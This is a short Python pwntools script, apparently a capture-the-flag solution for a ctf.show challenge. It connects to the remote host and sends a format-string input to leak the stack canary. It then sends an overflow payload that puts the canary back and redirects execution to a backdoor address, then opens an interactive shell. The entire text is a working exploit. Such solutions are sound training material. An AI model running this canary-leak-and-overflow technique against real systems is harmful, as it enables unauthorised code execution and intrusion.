from pwn import *
context(log_level='debug',arch='i386', os='linux')
#context(log_level='debug',arch='amd64', os='linux')

p=remote("pwn.challenge.ctf.show",28258)

backdoor=0x8048586
Leak=b'aaaa'+b'%15$p'
p.sendline(Leak)
p.recvuntil(b'aaaa0x')
canary=int(p.recv(8),16)
print(f'canary={hex(canary)}')
payload=b'a'*(0x2c-0xc)+p32(canary)+b'a'*0xc+p32(backdoor)
p.sendline(payload)
p.interactive()